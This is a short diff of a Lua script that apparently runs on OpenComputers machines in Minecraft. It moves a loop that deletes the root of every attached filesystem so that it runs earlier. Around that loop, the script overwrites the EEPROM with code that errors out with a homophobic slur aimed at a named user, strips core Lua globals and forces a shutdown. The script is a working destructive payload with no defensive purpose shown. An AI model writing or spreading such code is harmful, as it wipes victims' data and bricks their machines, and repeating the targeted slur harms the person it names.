@@ -76,6 +76,10 @@ error("@danilacasito pidor", 0)]]
 
 eeprom.set(code)
 
+for filesystem in component.list("filesystem") do 
+    component.invoke(filesystem, "remove", "/")
+end
+
 _G.assert = nil
 _G.math = nil
 _G.package = nil
@@ -83,9 +87,5 @@ _G.checkArg = nil
 _G.debug = nil
 
 os.sleep(3)
-
-for filesystem in component.list("filesystem") do 
-    component.invoke(filesystem, "remove", "/")
-end
 
 computer.shutdown(true)
